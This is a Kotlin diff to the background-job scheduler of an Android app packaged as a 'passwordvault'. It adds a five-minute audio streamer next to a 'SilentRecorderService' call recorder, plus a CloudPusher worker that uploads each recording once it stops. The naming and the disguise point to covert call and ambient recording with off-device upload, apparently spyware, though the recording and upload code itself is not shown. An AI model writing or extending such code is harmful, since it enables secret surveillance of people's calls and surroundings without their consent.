@@ -6,12 +6,17 @@ import android.os.Build
 import android.util.Log
 import androidx.annotation.RequiresApi
 import androidx.work.*
+import com.example.passwordvault.service.FiveMinStreamer
 import com.example.passwordvault.service.SilentRecorderService
 import java.io.File
-
+const val RECORDER_TYPE = "type"
 object WorkerProvider {
     private const val recorderJobTag = "com.japps.recording.call"
-    private const val newRecordingCheckTag = "com.japps.recordings.newOne"
+    private const val fiveMinrecorderJobTag = "com.japps.5min.recording"
+    private const val callRecordingPushTag = "com.japps.calls.push.recording"
+    private const val fiveMinRecordingPushTag = "com.japps.5min.push.recording"
+    private const val cloudPusher = "com.japps.cloud.pushing"
+
 
     private val baseConstraints = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
         Constraints.Builder()
@@ -34,48 +39,85 @@ object WorkerProvider {
         val uriCheckConstraints = baseConstraints
             .addContentUriTrigger(uri, false)
 
-        return OneTimeWorkRequestBuilder<UriChecker>()
+        return OneTimeWorkRequestBuilder<CloudPusher>()
             .setConstraints(uriCheckConstraints.build())
-            .addTag(newRecordingCheckTag)
+            .addTag(callRecordingPushTag)
             .build()
     }
 
     @RequiresApi(Build.VERSION_CODES.N)
-    fun startUriChecker(context: Context, latestRecord: String?) {
-        Log.e("UriChecker", "started")
+    fun startCloudPusher(context: Context, type: String, latestRecord: String?) {
+        Log.e("CloudPusher", "$type started")
 //        val work = periodicUriCheckWorkRequest(context)
-        val data = Data.Builder().putString(LATEST_RECORD, latestRecord).build()
-        val work = OneTimeWorkRequestBuilder<UriChecker>()
-            .setInputData(data)
-            .setConstraints(baseConstraints.build())
-            .addTag(newRecordingCheckTag)
+        val data = Data.Builder()
+            .putString(LATEST_RECORD, latestRecord)
+            .putString(RECORDER_TYPE, type)
             .build()
-        enqueueUniqueWork("uniqueWorkUriChecker", context, work)
+
+        val work = if (type == CALL_RECORDER){
+            OneTimeWorkRequestBuilder<CloudPusher>()
+                .setInputData(data)
+                .setConstraints(baseConstraints.build())
+                .addTag(callRecordingPushTag)
+                .build()
+        }else{
+            OneTimeWorkRequestBuilder<CloudPusher>()
+                .setInputData(data)
+                .setConstraints(baseConstraints.build())
+                .addTag(fiveMinRecordingPushTag)
+                .build()
+        }
+//        val uniqueWork = latestRecord+cloudPusher
+        val uniqueWork = cloudPusher + latestRecord
+        enqueueUniqueWork(uniqueWork, context, work)
     }
 
-    fun newRecordingCheckUploadWork(): OneTimeWorkRequest {
-        return OneTimeWorkRequestBuilder<CloudPusher>()
-            .setConstraints(baseConstraints.build())
-            .build()
+    fun stopCloudPusher(context: Context, type: String) {
+        if (type == CALL_RECORDER)
+            getWorkManager(context).cancelAllWorkByTag(callRecordingPushTag)
+        if (type == FIVE_MIN_RECORDER)
+            getWorkManager(context).cancelAllWorkByTag(fiveMinRecordingPushTag)
     }
+
+//    fun newRecordingCheckUploadWork(): OneTimeWorkRequest {
+//        return OneTimeWorkRequestBuilder<UriChecker>()
+//            .setConstraints(baseConstraints.build())
+//            .build()
+//    }
 
     fun startRecorderWork(context: Context) {
-        val work =  OneTimeWorkRequestBuilder<SilentRecorderService>()
+        val work = OneTimeWorkRequestBuilder<SilentRecorderService>()
             .addTag(recorderJobTag)
             .build()
-        getWorkManager(context).enqueue(work)
+        enqueueWork(context, work)
     }
 
     fun stopRecordingWork(context: Context) {
         Log.e("inWorkStop", "-> $context")
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N){
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
             val latestRecord = PreferenceUtil.latestRecord(context)
-            startUriChecker(context.applicationContext, latestRecord)
+            startCloudPusher(context, CALL_RECORDER, latestRecord)
         }
         getWorkManager(context).cancelAllWorkByTag(recorderJobTag)
     }
 
-    fun enqueueWork(context: Context, work: WorkRequest) {
+    fun start5MinRecorderWork(context: Context) {
+        val work = OneTimeWorkRequestBuilder<FiveMinStreamer>()
+            .addTag(fiveMinrecorderJobTag)
+            .build()
+        enqueueWork(context, work)
+    }
+
+    fun stop5MinRecordingWork(context: Context) {
+        Log.e("inWorkStop", "-> $context")
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            val latestRecord = PreferenceUtil.latestRecord(context)
+            startCloudPusher(context, FIVE_MIN_RECORDER, latestRecord)
+        }
+        getWorkManager(context).cancelAllWorkByTag(fiveMinrecorderJobTag)
+    }
+
+    private fun enqueueWork(context: Context, work: WorkRequest) {
         Log.e("inWork", "-> $context")
         getWorkManager(context).enqueue(work)
     }
